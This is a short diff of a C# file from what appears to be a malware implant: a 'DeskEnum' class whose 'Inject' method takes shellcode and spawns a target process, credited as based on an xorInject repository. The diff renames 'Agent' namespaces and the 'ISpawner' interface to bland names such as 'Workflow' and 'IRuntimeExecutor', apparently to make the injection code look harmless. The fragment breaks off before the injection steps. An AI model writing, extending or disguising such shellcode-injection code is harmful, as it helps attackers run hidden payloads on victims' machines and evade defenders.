@@ -1,19 +1,19 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Invoker.Dynamic;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
 using static Invoker.Data.Win32;
 
 //based upon https://github.com/JkMaFlLi/xorInject
-namespace Agent
+namespace Workflow
 {
     internal class DeskEnum : ITechnique
     {
         int ITechnique.id => 4;
         private static readonly TaskScheduler _singleThreadScheduler = new ConcurrentExclusiveSchedulerPair().ExclusiveScheduler;
 
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             if (!await spawner.Spawn(spawnOptions))
             {
